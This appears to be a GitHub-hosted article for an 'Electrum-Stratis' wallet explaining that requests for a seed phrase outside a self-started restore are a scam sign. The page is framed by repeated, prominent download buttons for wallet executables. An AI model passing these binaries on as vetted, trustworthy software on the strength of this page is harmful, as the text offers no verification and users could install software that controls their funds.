![Electrum-Stratis](assets/banner-article.png)

# Seed entry was never necessary: the red flag, and the tool that proved it

<p align="center">The red flag, and the tool that proved it</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

No legitimate flow in Electrum Stratis asks for a seed except a restore you start yourself. When a migration, a service or a stranger asks for one, the request is the red flag - and in the one historical case where holders were asked, a seed-free tool existed and was published by the community. That is the fact worth remembering: the requirement was never real, and it never is. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| The request | What it really is | What to do |
|---|---|---|
| "Enter your seed to migrate" | A demand for your keys | Refuse; look for a key-based route |
| A website asking to "verify" a phrase | Phishing, always | Close it |
| A person offering to check the seed | Social engineering | Stop replying |
| A tool that wants the phrase imported | Either amateur or malicious | Use key export instead |
| A restore screen asking for the phrase | The one legitimate case | Confirm you initiated it |

</div>

The distinction is authorship: a restore you chose is fine; a request someone else made is not. Every scam in this space depends on blurring that line.

## Why it happens

A seed is the wallet. Anyone holding it can derive every address and sign every transaction, so a request for it is a request for the funds - there is no "read-only" version of a phrase, and no way to prove ownership by revealing it. That is why the correct design never needs it: a migration or a transfer moves keys or coins, not phrases.

The historical case is instructive. Holders of hardware wallets were asked to type seeds into a desktop tool during the migration, and many refused on exactly this reasoning. The refusals were right, and a seed-free path - a tool that worked from the device's keys rather than its phrase - was published and circulated with a video and a manual. The requirement had been a convenience for the tool's authors, not a constraint of the technology - the same reasoning that makes [is Electrum Stratis safe](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) checkable rather than promotional.

The rule the current release enforces is narrow and absolute: outside a restore you started, no flow asks for a seed. The wallet is actively maintained, and that build is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

## Fix

1. **Ask who initiated the request.** If you opened the wallet and chose Recover, the prompt is legitimate. If a page, a person, a video or a "tool" asked first, it is not.
2. **Use a key-based route instead.** Exporting a private key from a legacy wallet and sweeping it moves value without exposing a phrase; that is how the Qt bridge works and how the hardware migration was done without seed entry.
3. **Refuse and record.** Do not argue with the request; close it, and note where it came from so the same page is recognisable later.
4. **If a seed was already entered, move the funds.** Create a new wallet, sweep the balance, and retire the exposed phrase. Speed matters more than diagnosis.
5. **Teach the test rather than the story.** The rule is not "be careful" but "a seed is only ever typed into a wallet you opened yourself, for a restore you chose".

A tool that cannot work without your seed is a tool that has chosen convenience over custody. There are always alternatives that work from keys.

## If that did not work

If a service insists the phrase is required, ask what it would do with it. There is no answer that survives scrutiny: deriving addresses needs only public information, and signing needs only the key.

If a seed has been exposed and the funds are already gone, the remaining steps are documentation and reporting, not recovery. Transaction IDs, addresses and timestamps are what a police report needs.

If a hardware device's manufacturer asks for the phrase during a firmware or migration step, that is still a request for the funds. Legitimate device flows sign on the device; they do not export the phrase.

## Prevention

- Never type a seed into a browser, an app you did not download yourself, or a form.
- Prefer key export and sweep for any migration.
- Treat urgency about a deadline as a manipulation tactic.
- Keep the phrase on paper, used only for a restore you initiate.
- Tell the next person: the requirement is never real.
- Tell anyone who shares the wallet: no restore you did not start ever needs a phrase.

## FAQ

### When can we safely swap tokens held on ledger devices?

The migration window is closed, so there is nothing to swap today. At the time, the safe route was a seed-free tool that worked from the device's keys, which is what holders who refused seed entry used.

### It is a red flag if users need to enter their seed - is that right?

Yes, and it is the single most reliable signal in this space. A genuine flow can always be built around keys or signatures; a demand for the phrase means the operator wants custody, whether or not they understand that is what they are asking for.

### Did anyone actually complete a migration without entering a seed?

Yes. A tool published during the window worked from the hardware wallet's keys and shipped with a video and a PDF manual, and holders used it precisely to avoid typing the phrase into a desktop application.

### What do I do if I already entered it?

Treat the wallet as compromised: create a new wallet from a fresh phrase, sweep the balance into it, and stop using the exposed seed. Changing a password does not help, because the phrase is what was exposed.

<!-- DOWNLOAD-BLOCK -->

No legitimate step in this wallet asks you to type a phrase to receive, to check a balance, to verify a build or to migrate. A seed is needed in exactly one place: restoring a wallet you already own, on a machine you control. Every other request for it is an attack with a friendly explanation attached, and the explanation is the part that should make you stop.

## Related articles

- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [The 2018 seed flaw: what it was](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-2018-seed-flaw.md)
- [Was my wallet affected?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/was-my-seed-affected.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
